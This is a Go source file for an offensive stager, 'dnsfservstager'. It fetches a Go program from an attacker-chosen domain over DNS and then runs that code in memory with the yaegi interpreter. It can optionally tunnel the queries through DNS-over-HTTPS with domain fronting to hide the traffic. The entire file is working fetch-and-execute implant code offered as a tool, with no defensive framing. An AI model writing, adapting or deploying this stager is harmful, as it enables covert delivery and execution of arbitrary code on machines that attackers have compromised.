// Program dnsfservstager downloads a Go program over DNS and runs it
package main

/*
 * dnsfservstager.go
 * Stager which runs a Go program it retrieves via DNS
 * By J. Stuart McMurray
 * Created 20200817
 * Last Modified 20200817
 */

import (
	"io/ioutil"
	"log"

	"github.com/containous/yaegi/interp"
	"github.com/containous/yaegi/stdlib"
	"github.com/magisterquis/dnsfserv/dnsfservget"
)

var (
	dohURL = ""
	dohSNI = ""
	domain = ""
	fname  = ""
)

func main() {
	/* Make sure we have a filename and domain, at least */
	if "" == fname {
		panic("missing filename")
	}
	if "" == domain {
		panic("missing domain")
	}

	/* Configure the file download */
	g := dnsfservget.Getter{
		Type:   dnsfservget.TypeA,
		Name:   fname,
		Domain: domain,
	}
	if "" != dohURL {
		/* Maybe even domain-front */
		conf := dnsfservget.DOHConfig{URL: dohURL}
		if "" != dohSNI {
			conf.POST = dnsfservget.BuiltinDFPOST(dohSNI)
		}
		/* Query with DoH */
		g.Querier = dnsfservget.DOHQuerier(conf)
	}

	/* Actually do the download */
	b, err := ioutil.ReadAll(g.Get())
	if nil != err {
		log.Fatalf("Get: %s", err)
	}

	/* Run it as Go code */
	i := interp.New(interp.Options{})
	i.Use(stdlib.Symbols)
	if _, err := i.Eval(string(b)); nil != err {
		log.Fatalf("Eval: %s", err)
	}
}
